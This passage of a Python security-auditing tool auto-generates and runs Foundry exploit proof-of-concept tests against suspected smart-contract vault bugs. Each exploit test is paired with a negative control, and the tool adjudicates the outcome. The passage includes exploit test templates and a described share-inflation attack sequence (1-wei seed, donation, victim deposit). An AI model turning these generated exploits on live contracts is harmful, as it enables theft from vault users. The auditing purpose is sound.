            field_decls.append(f"    {mock_name} {var};")
            new_expr = _mock_new_expr(mock_path, mock_name, base_token_var)
            if new_expr is None:
                return None
            setup_mock_lines.append(f"        {var} = {new_expr};")
            # iter17 (b): an address-typed token dep is passed as `address(var)`.
            init_args.append(f"address({var})" if arg.get("pass_as") == "address"
                             else var)
            if arg["is_erc20"] and base_token_var is None:
                base_token_var = var
            elif not arg["is_erc20"] and stake_vault_var is None:
                stake_vault_var = var
        elif atype == "address":
            init_args.append("owner")
        elif atype in ("string", "bytes"):
            init_args.append('""')
        elif re.fullmatch(r"uint\d*", atype) or re.fullmatch(r"int\d*", atype):
            init_args.append("0")
        elif atype == "bool":
            init_args.append("false")
        elif _is_app_dep_iface_type(atype):
            # obl9-prep: an APPLICATION-LEVEL interface dep (a config manager /
            # permission gate / price adapter the vault stores AND calls into),
            # neither ERC20 nor ERC4626. Synthesize a deployable mock from the
            # interface source (when resolvable in-tree) else the members the
            # target actually invokes on this param, so the REAL ctor/init call
            # on the dep succeeds. If the synth returns None (no synthesizable
            # member / lib absent) keep the honest block-with-obligation.
            methods_called = _dep_methods_called(rsrc, aname)
            iface_src = _resolve_iface_source(rsrc, project, atype)
            return_values = _protocol_dep_evidence_map(
                candidate, deploy_shape, "protocol_dep_mock_return_values",
                atype, aname)
            negative_control = _protocol_dep_evidence_map(
                candidate, deploy_shape,
                "protocol_dep_mock_negative_control_behavior", atype, aname)
            if negative_control is None:
                negative_control = _default_protocol_dep_negative_control(
                    atype, aname)
            synth = _synthesize_app_dep_mock(
                atype, methods_called, iface_src, gen_dir, test_pragma,
                len(synth_mocks), return_values=return_values,
                negative_control_behavior=negative_control)
            if not synth.get("ready"):
                _record_app_dep_obligations(deploy_shape, synth)
                return None
            mock_name = synth["name"]
            mock_path = Path(synth["path"])
            synth_mocks.append({
                "path": synth["path"],
                "name": mock_name,
                "implemented_members": synth.get("implemented_members", []),
            })
            rel = f"./{mock_path.name}"
            if mock_name not in seen_imports:
                import_lines.append(f'import {{{mock_name}}} from "{rel}";')
                seen_imports.add(mock_name)
            field_decls.append(f"    {mock_name} {var};")
            setup_mock_lines.append(f"        {var} = new {mock_name}();")
            init_args.append(f"address({var})" if atype == "address" else var)
        else:
            return None  # un-synthesizable initializer arg -> honest fallback

    if base_token_var is None:
        return None

    yld = _infer_yield_injection(rsrc, deploy_shape,
                                 base_var=base_token_var,
                                 stake_var=stake_vault_var)
    if yld is None:
        return None

    toggles = "\n".join(f"        vault.{t};" for t in deploy_shape.get("enable_toggles", []))
    init_arg_str = ", ".join(init_args)
    inject_stmt = yld["inject_stmt"]
    cited = candidate.get("file_line", "")

    # Caller-gate registration: when the inflation term is gated on
    # `caller == address(<var>)`, the actor must BE the registered <var>, so we
    # register the actor via the inferred owner setter and drive withdraw as the
    # actor. Without a gate, the actor is just a normal depositor.
    gate = deploy_shape.get("caller_gate")
    if gate:
        register_stmt = f"vault.{gate['setter']}(actor);"
    else:
        register_stmt = ""
    extra_imports = "\n".join(import_lines)
    field_block = "\n".join(field_decls)
    # iter17 (c): etch'd constant deps must be staged BEFORE the vault is deployed
    # (the vault may read the constant in its constructor), so the etch lines run
    # first in setUp, then the param mocks, then the deploy.
    # obl9-prep CAPABILITY 2: in fork-mode, `vm.createSelectFork(...)` runs FIRST
    # so all subsequent code (mock construction, deploy) executes against forked
    # state. The fork line precedes the synth/etch lines.
    setup_lines = etch_lines + setup_mock_lines
    if fork_cfg is not None:
        setup_lines = [_fork_select_stmt(fork_cfg)] + setup_lines
    setup_block = "\n".join(setup_lines)

    deploy_mode = deploy_shape.get("deploy_mode", "initialize")
    if deploy_mode == "constructor":
        # iter17 (a): non-upgradeable vault -> direct `new Vault(...)` deploy.
        deploy_body = (f"        return new {unit_name}({init_arg_str});")
        proxy_import = ""
        deploy_kind_note = f"directly via `new {unit_name}(...)` (non-upgradeable)"
    else:
        deploy_body = (
            f"        return {unit_name}(address(new ERC1967Proxy(\n"
            f"            address(new {unit_name}()),\n"
            f"            abi.encodeWithSelector("
            f"{unit_name}.initialize.selector, {init_arg_str})\n"
            f"        )));")
        proxy_import = ('import {ERC1967Proxy} from '
                        '"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";\n')
        deploy_kind_note = "via ERC1967Proxy (upgradeable initializer)"

    test_src = f"""// SPDX-License-Identifier: UNLICENSED
pragma solidity {test_pragma};

import {{Test}} from "forge-std/Test.sol";
{proxy_import}{extra_imports}
import {{{unit_name}}} from "{rel_vault}";

// AUTO-GENERATED by tools/evm-0day-proof-pipeline.py (vault-conservation
// IN-PLACE real-deploy auto-conversion, GENERIC iter15-A + iter17). Deploys the
// REAL {unit_name} {deploy_kind_note} with ONLY external-dependency mocks inferred
// from the deploy signature (synthesized + address-passed + vm.etch'd as needed),
// drives it into the inflating phase via the inferred
// `{phase_fn}()` lever, injects yield via the inferred {yld['kind']} lever, then
// drives the REAL {fn['name']} via the public {withdraw_fn}() entrypoint and
// asserts the cited accumulator-over-decrement at {cited}: `{acc}` drops by more
// than the base principal, so the conservation invariant
// `{acc} == sum(base deposits) - sum(base withdrawals)` breaks. Negative control:
// the non-inflating (no-yield) path conserves exactly.
// V3-GRADE (Rule 40): real entrypoint -> real protocol fn -> real accumulator
// delta assertion + a clean negative control. No target literal is hardcoded.

contract {unit_name}_{fn['name']}_ZeroDay is Test {{
{field_block}
    {unit_name} vault;
    address owner;
    address actor;
    uint256 constant PRINCIPAL = 100 ether;
    uint256 constant WD = 10 ether;
    uint256 constant INJECTED_YIELD = 20 ether;
    // ERC4626-donation lever: seed real shares first so previewRedeem is bounded.
    uint256 constant SEED_SHARES = 1 ether;

    function _deploy() internal returns ({unit_name}) {{
{deploy_body}
    }}

    function setUp() public {{
        owner = address(this);
        actor = makeAddr("actor");
{setup_block}
        vault = _deploy();
{toggles}
    }}

    function test_exploit_{fn['name']}() public {{
        {base_token_var}.mint(owner, PRINCIPAL);
        {base_token_var}.approve(address(vault), PRINCIPAL);
        vault.{deposit_fn}(PRINCIPAL, actor);

        // Drive the vault into the inflating phase, register the caller gate (if
        // the inflation term is caller-gated), then inject yield.
        vault.{phase_fn}();
        {register_stmt}
        {inject_stmt}

        uint256 baseBefore = vault.{acc}();
        assertEq(baseBefore, PRINCIPAL, "{acc} tracks principal pre-withdraw");

        // Drive the REAL {fn['name']} via the public {withdraw_fn}() entrypoint
        // as the actor (the registered caller-gate identity when one exists).
        vm.prank(actor);
        vault.{withdraw_fn}(WD, actor, actor);

        uint256 decremented = baseBefore - vault.{acc}();
        // BUG: accumulator decremented by (base + injected yield), not base alone.
        assertGt(decremented, WD,
            "conservation violated: {acc} dropped by more than base principal");
    }}

    function test_negative_control_{fn['name']}() public {{
        // Non-inflating path: no yield injected -> {acc} decremented by base only.
        {base_token_var}.mint(owner, PRINCIPAL);
        {base_token_var}.approve(address(vault), PRINCIPAL);
        vault.{deposit_fn}(PRINCIPAL, owner);

        uint256 baseBefore = vault.{acc}();
        vault.{withdraw_fn}(WD, owner, owner);
        uint256 decremented = baseBefore - vault.{acc}();
        assertEq(decremented, WD,
            "control: non-inflating path decrements {acc} by exactly base assets");
    }}
}}
"""
    return {"test_src": test_src,
            "test_match": f"test_(exploit|negative_control)_{fn['name']}",
            "synth_mocks": synth_mocks}


def _strip_comments(text: str) -> str:
    """Remove // line comments and /* */ block comments so contract-name
    detection does not match the word 'contract' inside NatSpec prose."""
    text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
    text = re.sub(r"//[^\n]*", "", text)
    return text


def _contract_name_in_file(p: Path) -> Optional[str]:
    """Return the first real `contract <Name>` DECLARATION in a .sol file. A
    declaration is `contract <Name>` followed by `is`, `{`, or whitespace then
    one of those - never the word 'contract' inside a NatSpec comment."""
    try:
        text = _strip_comments(p.read_text(errors="ignore"))
    except OSError:
        return None
    m = re.search(r"(?m)^\s*(?:abstract\s+)?contract\s+(\w+)\b\s*(?:is\b|\{)", text)
    if m:
        return m.group(1)
    # fall back: any `contract <Name> is` / `contract <Name> {` anywhere.
    m = re.search(r"\bcontract\s+(\w+)\b\s*(?:is\b|\{)", text)
    return m.group(1) if m else None


def _mock_new_expr(mock_path: Path, mock_name: str,
                   base_token_var: Optional[str]) -> Optional[str]:
    """Build the `new <Mock>(...)` ctor call by reading the mock's constructor
    arity FROM SOURCE. Handles the two common shapes generically:
      - no-arg ctor  -> `new Mock()`
      - ERC4626 staking-mock ctor `(IERC20 asset, address rewarder, address owner)`
        -> `new Mock(<base_token_var>, owner, owner)` (the Ethena StakedUSDe shape)
    Returns None for an un-inferable ctor (caller falls back)."""
    try:
        text = mock_path.read_text(errors="ignore")
    except OSError:
        return None
    m = re.search(r"constructor\s*\(([^)]*)\)", text)
    params = _split_params(m.group(1)) if m else []
    if not params:
        return f"new {mock_name}()"
    # ERC4626 staking-mock: (asset, rewarder, owner) -> needs the base token var.
    types = [t for (t, _n) in params]
    if (types and (types[0] in _ERC20_ARG_TYPES or types[0] == "IERC20")
            and base_token_var):
        args = [base_token_var]
        for t in types[1:]:
            if t == "address":
                args.append("owner")
            elif re.fullmatch(r"uint\d*", t) or re.fullmatch(r"int\d*", t):
                args.append("0")
            elif t == "bool":
                args.append("false")
            else:
                return None
        return f"new {mock_name}({', '.join(args)})"
    return None


# ---------------------------------------------------------------------------
# Candidate parsing
# ---------------------------------------------------------------------------

def parse_file_line(file_line: str) -> Tuple[str, Optional[int]]:
    """Split 'src/Foo.sol:142' -> ('src/Foo.sol', 142)."""
    if not file_line:
        return "", None
    m = re.match(r"^(.*?):(\d+)$", file_line.strip())
    if m:
        return m.group(1), int(m.group(2))
    return file_line.strip(), None


def _iter_strings(value: Any) -> List[str]:
    if value is None:
        return []
    if isinstance(value, str):
        return [value]
    if isinstance(value, list):
        out: List[str] = []
        for item in value:
            out.extend(_iter_strings(item))
        return out
    return [str(value)]


_SOURCE_REF_RE = re.compile(
    r"([A-Za-z0-9_./@~+\-]+?\.(?:sol|vy))(?:#L?(\d+)|:(\d+))?"
)


def _workspace_relative_source(path_text: str, workspace: Optional[Path]) -> str:
    if not workspace:
        return path_text
    src = Path(path_text).expanduser()
    if not src.is_absolute():
        return path_text
    try:
        return str(src.resolve().relative_to(workspace.resolve()))
    except ValueError:
        return path_text


def _first_source_file_line(*values: Any, workspace: Optional[Path] = None) -> str:
    """Return the first EVM source `path.sol[:line]` citation from row fields."""
    for text in _iter_strings(list(values)):
        text = text.strip()
        if not text:
            continue
        m = _SOURCE_REF_RE.search(text)
        if m:
            rel = _workspace_relative_source(m.group(1), workspace)
            line = m.group(2) or m.group(3)
            return f"{rel}:{line}" if line else rel
    return ""


def resolve_in_tree(workspace: Optional[Path], rel_path: str, contract: str) -> bool:
    """Return True if the cited file (or a file defining the contract) is in
    the workspace tree. This drives the claim-narrowed-out-of-tree verdict."""
    if not workspace or not workspace.exists():
        return False
    if rel_path:
        cand = workspace / rel_path
        if cand.exists():
            return True
        # Try by basename anywhere in the tree.
        base = Path(rel_path).name
        for p in workspace.rglob(base):
            if p.is_file():
                return True
    # Fall back: search for a .sol file defining `contract <Name>`.
    if contract:
        pat = re.compile(r"\b(?:contract|library|interface)\s+" + re.escape(contract) + r"\b")
        for p in workspace.rglob("*.sol"):
            try:
                if pat.search(p.read_text(errors="ignore")):
                    return True
            except Exception:
                continue
    return False


# ---------------------------------------------------------------------------
# Scaffold emission
# ---------------------------------------------------------------------------

def build_scaffold(candidate: Dict[str, Any], in_tree: bool) -> str:
    contract = candidate["contract"]
    fn = candidate["fn"]
    vuln_class = candidate["vuln_class"]
    file_line = candidate.get("file_line", "")
    tpl = get_template(vuln_class)

    comment = tpl["comment"].format(fn=fn)
    exploit_body = tpl["exploit_body"].format(fn=fn)
    control_body = tpl["control_body"].format(fn=fn)

    in_tree_banner = (
        "// REAL entrypoint resolved IN-TREE: candidate file exists in workspace."
        if in_tree
        else "// WARNING: cited contract/file NOT resolved in workspace tree.\n"
        "// Verdict will narrow to source-level gap (claim-narrowed-out-of-tree)\n"
        "// unless you wire the real import below to an in-scope path."
    )

    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// AUTO-GENERATED by tools/evm-0day-proof-pipeline.py
// V3-GRADE PoC (Rule 40): real entrypoint -> real vulnerable code -> real
// impact surface; mocks for EXTERNAL dependencies only; negative control
// present; before/after balance/state assertions present.
//
// Candidate: contract={contract} fn={fn} vuln_class={vuln_class} at {file_line}
// {comment}
{in_tree_banner}

import "forge-std/Test.sol";
// TODO: import the REAL in-scope target. Mocks below are EXTERNAL deps only.
// import {{{contract}}} from "{(candidate.get('rel_path') or 'src/'+contract+'.sol')}";

contract {contract}_ZeroDayProof is Test {{
    // target = the REAL protocol-owned vulnerable contract (drive the real entrypoint)
    {contract} target;
    // patched = a clean/canonical variant for the NEGATIVE CONTROL
    {contract} patched;

    // EXTERNAL-dependency mocks ONLY (each assumption stated inline above).
    address attacker = address(0xA11CE);
    address victim = address(0x71C7);

    function setUp() public {{
        // TODO: deploy the REAL target at the audit-pin state.
        // target = new {contract}(...);
        // patched = new {contract}_Patched(...); // canonical / fixed variant
    }}

    /// Exploit drives the REAL {fn} and asserts the downstream impact.
    function test_exploit_{fn}() public {{
{exploit_body}
    }}

    /// Negative control: the same attack against the clean path does NOT
    /// reproduce the impact (Rule 40 point 4).
    function test_negative_control_{fn}() public {{
{control_body}
    }}
}}
"""


# ---------------------------------------------------------------------------
# Forge invocation
# ---------------------------------------------------------------------------

def resolve_forge() -> Optional[str]:
    if FORGE_RESOLVE.exists():
        try:
            r = subprocess.run(
                ["bash", "-c", f'source "{FORGE_RESOLVE}" && echo "$FORGE_BIN"'],
                capture_output=True, text=True, timeout=30,
            )
            if r.returncode == 0:
                p = r.stdout.strip()
                if p and os.path.exists(p):
                    return p
        except Exception:
            pass
    for cand in [os.path.expanduser("~/.auditooor/bin/forge"),
                 os.path.expanduser("~/.foundry/bin/forge"), "forge"]:
        try:
            if subprocess.run(["which", cand], capture_output=True).returncode == 0:
                return cand
        except Exception:
            continue
    return None


def is_foundry_project(workspace: Optional[Path]) -> bool:
    if not workspace:
        return False
    return (workspace / "foundry.toml").exists() or (workspace / "lib" / "forge-std").exists()


def run_forge(forge_bin: str, workspace: Path, test_match: str, timeout: int = 600) -> Dict[str, Any]:
    """Run `forge test --match-test <test_match>` and parse per-test results."""
    try:
        r = subprocess.run(
            [forge_bin, "test", "--match-test", test_match, "-vv"],
            cwd=str(workspace), capture_output=True, text=True, timeout=timeout,
        )
        out = (r.stdout or "") + "\n" + (r.stderr or "")
    except subprocess.TimeoutExpired:
        return {"ran": True, "timeout": True, "exploit_pass": False,
                "control_pass": False, "raw_tail": "forge test timed out"}
    except Exception as e:  # pragma: no cover - environmental
        return {"ran": False, "error": str(e), "exploit_pass": False, "control_pass": False}

    return parse_forge_output(out, return_code=r.returncode)


_FORGE_COMPILE_FAIL_RE = re.compile(
    r"Compiler run failed|Failed to compile|Source .* not found|"
    r"ParserError:|DeclarationError:|TypeError:|Undeclared identifier|"
    r"Error \(\d+\)|error\[|failed to resolve file",
    re.IGNORECASE,
)


def parse_forge_output(out: str, return_code: int = 0) -> Dict[str, Any]:
    """Parse forge -vv output into per-test PASS/FAIL booleans."""
    exploit_pass = bool(re.search(r"\[PASS\]\s+test_exploit_", out))
    exploit_fail = bool(re.search(r"\[FAIL[^\]]*\]\s+test_exploit_", out))
    control_pass = bool(re.search(r"\[PASS\]\s+test_negative_control_", out))
    control_fail = bool(re.search(r"\[FAIL[^\]]*\]\s+test_negative_control_", out))
    saw_test_result = exploit_pass or exploit_fail or control_pass or control_fail
    compile_fail = bool(_FORGE_COMPILE_FAIL_RE.search(out))
    if return_code != 0 and not saw_test_result:
        compile_fail = True
    return {
        "ran": True,
        "timeout": False,
        "return_code": return_code,
        "exploit_pass": exploit_pass and not exploit_fail,
        "exploit_fail": exploit_fail,
        "control_pass": control_pass and not control_fail,
        "control_fail": control_fail,
        "compile_fail": compile_fail,
        "raw_output": out,
        "raw_tail": "\n".join(out.splitlines()[-25:]),
    }


# ---------------------------------------------------------------------------
# Adjudication
# ---------------------------------------------------------------------------

def adjudicate(in_tree: bool, run: Optional[Dict[str, Any]]) -> Tuple[str, str]:
    """Map (in-tree?, forge run result) -> (verdict, reason)."""
    if not in_tree:
        return ("claim-narrowed-out-of-tree",
                "The cited contract/file was not resolved in the workspace tree; "
                "the real entrypoint is an out-of-tree dependency. Claim narrowed "
                "to a source-level gap; PoC is scaffold-only.")
    if run is None:
        return ("scaffold-only-not-run",
                "Scaffold authored against an in-tree target but forge was not run "
                "(--no-run, no foundry project, or forge unavailable).")
    if not run.get("ran"):
        return ("scaffold-only-not-run",
                f"forge did not run: {run.get('error', 'unknown')}.")
    if run.get("compile_fail"):
        return ("compile-blocked-with-obligation",
                "Scaffold did not compile yet - wire the real import + setUp() and re-run.")
    if run.get("timeout"):
        return ("scaffold-only-not-run", "forge test timed out.")
    exploit_pass = run.get("exploit_pass")
    control_pass = run.get("control_pass")
    if exploit_pass and control_pass:
        return ("proof-backed",
                "Exploit test PASSED (real entrypoint -> vuln -> asserted impact) "
                "AND negative control PASSED (clean path does not reproduce).")
    if not exploit_pass:
        return ("refuted",
                "Exploit test did NOT reproduce the claimed impact; the vuln does "
                "not manifest against the real entrypoint as scaffolded.")
    # exploit passed but control failed -> control not yet a true negative
    return ("scaffold-only-not-run",
            "Exploit PASSED but the negative control did not PASS as a clean "
            "baseline; wire the patched variant so the control is a true negative "
            "before claiming proof-backed.")


VERDICT_EXIT = {
    "proof-backed": 0,
    "claim-narrowed-out-of-tree": 0,
    "scaffold-only-not-run": 0,
    "blocked-with-obligation": 0,
    "compile-blocked-with-obligation": 0,
    "refuted": 1,
    "error": 2,
}


# ---------------------------------------------------------------------------
# REAL run-backed proof attempt (the iter6-A capability).
# ---------------------------------------------------------------------------

def _attempt_inplace_vault_conservation(
        candidate: Dict[str, Any], src: str, unit_name: str, fn: Dict[str, Any],
        shape: Dict[str, str], src_file: Path, workspace: Path,
        out_dir: Optional[Path]) -> Optional[Dict[str, Any]]:
    """Try to author+compile+run the REAL-deploy in-place vault-conservation
    PoC. Returns a result dict (proof-backed / blocked-with-obligation) when the
    deploy shape is RECOGNIZED, or None when it is not (so the caller falls back
    to the self-contained reproduction)."""
    project = find_enclosing_foundry_project(src_file, workspace)
    if project is None:
        return None
    deploy_shape = detect_inplace_vault_deploy_shape(src, project, unit_name)
    if deploy_shape is None:
        return None  # unrecognized deploy shape -> fall back to standalone repro
    test_dir = _project_test_dir(project)
    authored = author_vault_conservation_inplace(
        candidate, src, unit_name, fn, shape, test_dir, project, deploy_shape)
    if authored is None:
        obligations = deploy_shape.get("app_dep_mock_obligations", [])
        if obligations:
            obligation_text = "; ".join(str(o) for o in obligations)
            return {
                "verdict": "blocked-with-obligation",
                "reason": (
                    f"{unit_name}.{fn['name']} is deployable in-place only if "
                    "its application-level protocol dependency mock has complete "
                    "method, return-value, and negative-control evidence."
                ),
                "obligation": obligation_text,
                "mock_synthesis_ready": False,
                "mock_synthesis_obligations": list(obligations),
                "mock_synthesis_implemented_members": deploy_shape.get(
                    "app_dep_mock_implemented_members", []),
            }
        return None
    forge_bin = resolve_forge()
    if not forge_bin:
        return {"verdict": "blocked-with-obligation",
                "reason": "forge not found on PATH.",
                "obligation": "install foundry (forge)."}

    # GAP-B+1: honor the project foundry.toml solc pin. When the pinned solc is
    # not installed, attempt a bounded install; if still unavailable, block with a
    # precise obligation naming the missing solc rather than running under a solc
    # the project rejects.
    solc_block = _preflight_project_solc(project)
    if solc_block is not None:
        return solc_block

    # synthesize remappings if the project ships no deps / no remappings.txt.
    need_remap = _project_needs_remapping_synthesis(project)
    mapping = None
    if need_remap:
        mapping = _find_sibling_oz_and_forge_std(Path.home() / "audits")
        if mapping is None:
            return {"verdict": "blocked-with-obligation",
                    "reason": f"{unit_name}.{fn['name']} is deployable in-place but the "
                              "project ships no installed deps (node_modules/lib absent) and "
                              "no version-compatible OZ+forge-std sibling checkout was found "
                              "to vendor via synthesized remappings.",
                    "obligation": "install the project deps (npm i / forge install) OR provide "
                                  "an OZ-5.x + forge-std checkout under ~/audits to vendor."}

    gen_dir = test_dir / "_evm0day_autoproof"
    gen_dir.mkdir(parents=True, exist_ok=True)
    test_file = gen_dir / f"{unit_name}_{fn['name']}_ZeroDay.t.sol"
    test_file.write_text(authored["test_src"])
    # iter16: synthesized dependency mocks were written into gen_dir by the
    # author; mirror them to out_dir for the evidence bundle and remove them
    # (and the test) after the run so the project tree is left pristine.
    synth_mocks = authored.get("synth_mocks", [])
    if out_dir:
        out_dir.mkdir(parents=True, exist_ok=True)
        (out_dir / test_file.name).write_text(authored["test_src"])
        for sm in synth_mocks:
            try:
                (out_dir / Path(sm["path"]).name).write_text(
                    Path(sm["path"]).read_text())
            except OSError:
                pass

    try:
        if mapping is not None:
            with _SynthesizedRemappings(project, mapping):
                run = run_forge(forge_bin, project, authored["test_match"])
        else:
            run = run_forge(forge_bin, project, authored["test_match"])
    finally:
        try:
            test_file.unlink()
            for sm in synth_mocks:
                try:
                    Path(sm["path"]).unlink()
                except OSError:
                    pass
            if gen_dir.exists() and not any(gen_dir.iterdir()):
                gen_dir.rmdir()
        except OSError:
            pass

    return _adjudicate_real_run(
        run, project, str(out_dir / test_file.name) if out_dir else None,
        unit_name, fn["name"], "vault-conservation-inplace-real-deploy")


def attempt_real_proof(candidate: Dict[str, Any], workspace: Optional[Path],
                       out_dir: Optional[Path]) -> Optional[Dict[str, Any]]:
    """Try to AUTHOR + COMPILE + RUN a real run-backed PoC against the in-tree
    target. Returns a result dict (verdict in {proof-backed, refuted,
    blocked-with-obligation}) or None if this path does not apply (caller
    falls back to the legacy scaffold path).
    """
    rel_path = candidate.get("rel_path", "")
    if not (workspace and rel_path):
        return None
    src_file = workspace / rel_path
    if not src_file.exists():
        # try basename anywhere
        for p in workspace.rglob(Path(rel_path).name):
            if p.is_file():
                src_file = p
                rel_path = str(p.relative_to(workspace))
                break
        else:
            return None
    try:
        src = src_file.read_text(errors="ignore")
    except OSError:
        return None
    line_no = candidate.get("line")
    unit_name, unit_kind, is_abstract = _enclosing_unit(src, line_no)
    fn = _fn_at_line(src, line_no)
    vc = candidate["vuln_class"]

    forge_std = find_forge_std()
    if forge_std is None:
        return {"verdict": "blocked-with-obligation",
                "reason": "no forge-std checkout found to vendor; set AUDITOOOR_FORGE_STD.",
                "obligation": "provide a forge-std checkout (AUDITOOOR_FORGE_STD=<path>)."}

    # --- vault-accounting-conservation path (iter11-A) ---
    # Fires for the vault-conservation class on ANY in-tree vault contract,
    # including deep-graph upgradeable vaults whose full dep graph cannot be
    # auto-deployed: we synthesize a FAITHFUL self-contained reproduction of the
    # cited accumulator-over-decrement shape (no protocol-owned path is mocked
    # away - the bug's root cause is reproduced directly) and run it under forge.
    if vc == "vault-conservation":
        shape = detect_vault_conservation_shape(src, fn)
        if shape is None:
            return {"verdict": "blocked-with-obligation",
                    "reason": f"vuln_class 'vault-conservation' cited on {unit_name}."
                              f"{fn['name'] if fn else '?'} but the conservation shape "
                              "(tracked accumulator + yield-inflation site + accumulator "
                              "over-decrement by the inflated var) was not detected in the "
                              "cited source.",
                    "obligation": "confirm the cited line is an accumulator-over-decrement "
                                  "(`<acc> -= (assets + previewYield(...))`); if the inflation "
                                  "and decrement use different vars, the conservation invariant "
                                  "holds and this is not the bug."}

        # --- DEFAULT path: drive the REAL contract IN-PLACE (iter14-A) -------
        # Before falling back to a self-contained reproduction, try to deploy
        # and drive the REAL upgradeable vault in its own foundry project so the
        # real OZ/upgradeable dep graph + the real protocol-coupled fn run
        # unmodified. Only external-dependency ERC20/ERC4626 mocks are used.
        if unit_kind == "contract" and not is_abstract:
            inplace = _attempt_inplace_vault_conservation(
                candidate, src, unit_name, fn, shape, src_file, workspace, out_dir)
            if inplace is not None:
                return inplace

        authored = author_vault_conservation_proof(candidate, src, unit_name, fn, shape)
        # FAITHFUL self-contained reproduction imports nothing from the real
        # deep-graph tree, so we compile it standalone (forge never resolves the
        # target's OZ/upgradeable dependency graph).
        proj = build_standalone_runner(forge_std, authored["test_src"], _read_pragma(src))
        if proj is None:
            return {"verdict": "blocked-with-obligation",
                    "reason": "could not build the self-contained runner (symlink failed).",
                    "obligation": "ensure the workspace src tree is symlinkable."}
        if out_dir:
            out_dir.mkdir(parents=True, exist_ok=True)
            (out_dir / f"{unit_name}_{fn['name']}_ZeroDay.t.sol").write_text(authored["test_src"])
        forge_bin = resolve_forge()
        if not forge_bin:
            return {"verdict": "blocked-with-obligation",
                    "reason": "forge not found on PATH.",
                    "obligation": "install foundry (forge)."}
        run = run_forge(forge_bin, proj, authored["test_match"])
        return _adjudicate_real_run(run, proj, str(out_dir) if out_dir else None,
                                    unit_name, fn["name"], "vault-conservation-repro")

    # --- pure-library / pure-view path (no deploy needed) ---
    if vc in PURE_FN_CLASSES and unit_kind == "library" and fn and fn["mutability"] in ("pure", "view"):
        # import path: symlink the top-level src subdir at the project root and
        # import the target by its path relative to that subdir's PARENT.
        sub = _top_src_subdir(rel_path)
        rel_import = rel_path  # imports resolve via src=<sub> + path under it
        authored = author_pure_library_proof(candidate, src, unit_name, fn, rel_import)
        if authored is None:
            return {"verdict": "blocked-with-obligation",
                    "reason": f"pure-library defect class '{vc}' on {unit_name}.{fn['name']} "
                              "has no auto-author template for this fn shape yet.",
                    "obligation": f"add a per-fn input author for {unit_name}.{fn['name']} "
                                  "in _author_decode_mismatch (or sibling)."}
        proj = build_self_contained_runner(
            workspace, sub, forge_std, authored["test_src"], _read_pragma(src))
        if proj is None:
            return {"verdict": "blocked-with-obligation",
                    "reason": "could not build the self-contained runner (symlink failed).",
                    "obligation": "ensure the workspace src tree is symlinkable."}
        if out_dir:
            out_dir.mkdir(parents=True, exist_ok=True)
            (out_dir / f"{unit_name}_{fn['name']}_ZeroDay.t.sol").write_text(authored["test_src"])
        forge_bin = resolve_forge()
        if not forge_bin:
            return {"verdict": "blocked-with-obligation",
                    "reason": "forge not found on PATH.",
                    "obligation": "install foundry (forge)."}
        run = run_forge(forge_bin, proj, authored["test_match"])
        return _adjudicate_real_run(run, proj, str(out_dir) if out_dir else None,
                                    unit_name, fn["name"], "pure-library")

    # --- Step 2: EXTERNAL ENTRYPOINT BINDER ---------------------------------
    # If the cited vulnerable fn is internal/private (or a library-only fn that
    # did NOT take the pure-library path above), it cannot be driven directly.
    # Bind it to a REAL external/public wrapper in the same compilation unit (or
    # an inheriting contract) that reaches it, and author the harness to drive
    # the bug THROUGH that public wrapper. If no public caller reaches the
    # internal fn, emit a SPECIFIC entrypoint obligation naming the missing
    # caller (compile-blocked / blocked-with-obligation), never a fake proof.
    bound_via = None
    if fn and fn.get("visibility") in ("internal", "private"):
        project_for_bind = find_enclosing_foundry_project(src_file, workspace)
        wrap = find_public_wrapper_for_internal_fn(
            src, fn, project_for_bind, unit_name)
        if wrap is None:
            return {"verdict": "blocked-with-obligation",
                    "reason": f"{unit_name}.{fn['name']} ({vc}) is "
                              f"{fn['visibility']}-only and no external/public "
                              "caller reaching it was found in the cited unit or "
                              "its in-project inheritors, so the bug cannot be "
                              "driven through a real entrypoint.",
                    "obligation": f"identify (or add to scope) the external/public "
                                  f"caller that reaches {unit_name}.{fn['name']} "
                                  "and re-cite it as the entrypoint; if the fn is "
                                  "only reachable via an out-of-tree caller, the "
                                  "claim narrows to a source-level gap."}
        # Re-target the harness to the public wrapper. For a descendant wrapper,
        # the driven contract is the concrete child (it exposes the entrypoint).
        bound_via = wrap["via"]
        if wrap["via"] == "descendant" and wrap.get("descendant_unit"):
            unit_name = wrap["descendant_unit"]
            src = wrap["descendant_src"]
            unit_kind, _, is_abstract = ("contract", None, False)
        fn = wrap["wrapper"]

    # --- deployable-contract path: in-place author+run in the real project ---
    if unit_kind == "contract" and not is_abstract and fn:
        project = find_enclosing_foundry_project(src_file, workspace)
        # GAP A: when the resolved project is a provisioned SIBLING repo (the
        # cited file lives under a mirror, not under the project), re-resolve the
        # cited file to the project's own copy so the authored import stays inside
        # the project tree (otherwise the import escapes the root and forge
        # cannot compile the cited contract).
        if project is not None:
            src_file = _resolve_src_file_in_project(src_file, project)
        # Step 3 precise obligation: a share-inflation candidate whose vault is
        # NOT single-asset-constructor synthesizable gets a SPECIFIC next action
        # rather than the generic deployable block.
        if vc == "share-inflation" and detect_share_inflation_shape(src, fn) and \
                author_share_inflation_proof(
                    candidate, src, unit_name, fn, "x",
                    detect_share_inflation_shape(src, fn), project) is None:
            ctor_params = _constructor_params(src, unit_name)
            return {"verdict": "blocked-with-obligation",
                    "reason": f"{unit_name} exhibits the donation/share-price-"
                              "inflation shape (donation-inflatable denominator + "
                              "rounding-down convert + deposit entrypoint) but its "
                              f"constructor (args: {(ctor_params or '').strip() or 'none'}) "
                              "is not a single synthesizable ERC20-asset deploy, so "
                              "the real vault cannot be auto-deployed generically.",
                    "obligation": f"author the asset + any extra constructor "
                                  f"dependency mocks for {unit_name}, deploy it, drive "
                                  f"{fn['name']}() with the attacker 1-wei-seed + "
                                  "donation + victim-deposit sequence, and assert the "
                                  "victim is rounded to 0 shares (with a no-donation "
                                  "negative control)."}
        if project is not None:
            # Relative import from the project's test dir to the real contract.
            test_dir = _project_test_dir(project)
            authored = author_deployable_proof(
                candidate, src, unit_name, fn,
                _rel_import_from(test_dir / "_evm0day", src_file), project)
            if authored is not None:
                forge_bin = resolve_forge()
                if not forge_bin:
                    return {"verdict": "blocked-with-obligation",
                            "reason": "forge not found on PATH.",
                            "obligation": "install foundry (forge)."}
                # GAP-B+1: honor the project foundry.toml solc pin (install-or-block).
                solc_block = _preflight_project_solc(project)
                if solc_block is not None:
